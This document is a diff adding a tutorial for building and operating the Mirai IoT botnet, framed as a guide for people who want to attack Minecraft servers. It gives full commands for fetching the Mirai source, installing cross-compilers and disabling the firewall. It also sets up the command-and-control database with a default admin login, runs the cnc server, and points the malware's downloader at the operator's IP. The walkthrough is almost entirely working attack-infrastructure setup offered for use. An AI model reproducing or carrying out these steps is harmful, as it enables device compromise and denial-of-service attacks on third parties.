@@ -1,0 +1,155 @@
+--Full tutorial from scratch even though mirai is dead but still some skiddies want to build mirai botnet to launch attack on minecraft servers.
+
+[01]- Installing Dependencies required for Mirai-Botnet
+ apt-get update -y
+ apt-get upgrade -y
+ apt-get install gcc golang electric-fence sudo git -y
+ apt-get install mysql-server mysql-client -y
+ apt-get install nano make screen apache2 -y
+ git clone https://github.com/jgamblin/Mirai-Source-Code
+
+[01.1]- New version of Golang has been released and there isn't a library for it yet so thats why you will get error like this: "go/src/github.com/go-sql-driver/mysql/utils.go:806: undefined: atomic.Value" in later steps while building the "go get github.com/go-sql-driver/mysql". So the fix for it is below:
+
+sudo apt-get install curl git mercurial make binutils bison gcc build-essential -y
+bash < <(curl -s -S -L https://raw.githubusercontent.com/moovweb/gvm/master/binscripts/gvm-installer)
+gvm install go1.4
+gvm use go1.4 [--default]
+gvm install go1.4 -B
+gvm use go1.4
+export GOROOT_BOOTSTRAP=$GOROOT
+gvm install go1.5
+gvm use go1.5
+go get github.com/go-sql-driver/mysql
+go get github.com/mattn/go-shellwords
+
+If you get error during this step "go get github.com/mattn/go-shellwords", then try upgrading go to version 1.6 it will fix it:
+
+gvm install go1.6
+gvm use go1.6
+
+then run:
+go get github.com/mattn/go-shellwords
+
+This will fix the error and you can easily build the botnet next.
+
+[02]- Installing and Compiling the Cross-Compilers
+
+ mkdir /etc/xcompile
+ cd /etc/xcompile
+ 
+ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
+ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
+ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
+ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
+ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
+ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
+ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
+ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2
+ wget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2
+ 
+ tar -jxf cross-compiler-armv4l.tar.bz2
+ tar -jxf cross-compiler-i586.tar.bz2
+ tar -jxf cross-compiler-m68k.tar.bz2
+ tar -jxf cross-compiler-mips.tar.bz2
+ tar -jxf cross-compiler-mipsel.tar.bz2
+ tar -jxf cross-compiler-powerpc.tar.bz2
+ tar -jxf cross-compiler-sh4.tar.bz2
+ tar -jxf cross-compiler-sparc.tar.bz2
+ tar -jxf cross-compiler-armv6l.tar.bz2
+ 
+ rm *.tar.bz2
+ mv cross-compiler-armv4l armv4l
+ mv cross-compiler-i586 i586
+ mv cross-compiler-m68k m68k
+ mv cross-compiler-mips mips
+ mv cross-compiler-mipsel mipsel
+ mv cross-compiler-powerpc powerpc
+ mv cross-compiler-sh4 sh4
+ mv cross-compiler-sparc sparc
+ mv cross-compiler-armv6l armv6l
+
+[03]- For adding GoLang Paths
+
+export PATH=$PATH:/etc/xcompile/armv4l/bin
+export PATH=$PATH:/etc/xcompile/armv6l/bin
+export PATH=$PATH:/etc/xcompile/i586/bin
+export PATH=$PATH:/etc/xcompile/m68k/bin
+export PATH=$PATH:/etc/xcompile/mips/bin
+export PATH=$PATH:/etc/xcompile/mipsel/bin
+export PATH=$PATH:/etc/xcompile/powerpc/bin
+export PATH=$PATH:/etc/xcompile/powerpc-440fp/bin
+export PATH=$PATH:/etc/xcompile/sh4/bin
+export PATH=$PATH:/etc/xcompile/sparc/bin
+export PATH=$PATH:/etc/xcompile/armv6l/bin
+ 
+[05]- Database Setup
+--If you have iptbales/ip6tables or any firewall install disable it.
+ 
+service iptables stop
+/etc/ini.d/iptbales stop
+ 
+--Database Setup
+;Type the following command:
+mysql_secure_installation
+
+mysql -u root -p    (
+
+;Now you will have to type these to create database for botnet:
+CREATE DATABASE botnet;
+use botnet;
+
+CREATE TABLE `history` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `user_id` int(10) unsigned NOT NULL,
+  `time_sent` int(10) unsigned NOT NULL,
+  `duration` int(10) unsigned NOT NULL,
+  `command` text NOT NULL,
+  `max_bots` int(11) DEFAULT '-1',
+  PRIMARY KEY (`id`),
+  KEY `user_id` (`user_id`)
+);
+ 
+CREATE TABLE `users` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `username` varchar(32) NOT NULL,
+  `password` varchar(32) NOT NULL,
+  `duration_limit` int(10) unsigned DEFAULT NULL,
+  `cooldown` int(10) unsigned NOT NULL,
+  `wrc` int(10) unsigned DEFAULT NULL,
+  `last_paid` int(10) unsigned NOT NULL,
+  `max_bots` int(11) DEFAULT '-1',
+  `admin` int(10) unsigned DEFAULT '0',
+  `intvl` int(10) unsigned DEFAULT '30',
+  `api_key` text,
+  PRIMARY KEY (`id`),
+  KEY `username` (`username`)
+);
+ 
+CREATE TABLE `whitelist` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `prefix` varchar(16) DEFAULT NULL,
+  `netmask` tinyint(3) unsigned DEFAULT NULL,
+  PRIMARY KEY (`id`),
+  KEY `prefix` (`prefix`)
+);
+
+INSERT INTO users VALUES (NULL, 'root', 'botnet', 0, 0, 0, 0, -1, 1, 30, '');
+
+;Now your server is online type:
+service mysql restart
+;Once you restart the mysql server, go to your release folder /mirai/release you will seen a compiled file named cnc execute it. Type:
+cd Mirai-Source-Code/mirai/release
+./cnc
+;You will see something like this: https://prnt.sc/dnsluv    (Creds to Jihadi for the screenshot) then you have to detach the server.
+;Now you can login with your credentials through your ssh client with telnet.
+
+[06]- Scanning Setup
+
+;Now go to dlr by typing:
+cd
+cd Mirai-Source-Code/dlr
+chmod 777 *
+nano main.c  (change 127,0,0,1 in line 8 with your Server-Ip-Address remember to put comma instead of fullstop like this: 46,101,53,23)
+./build.sh 
+cd release
+mv dlr* ../../loader/bins
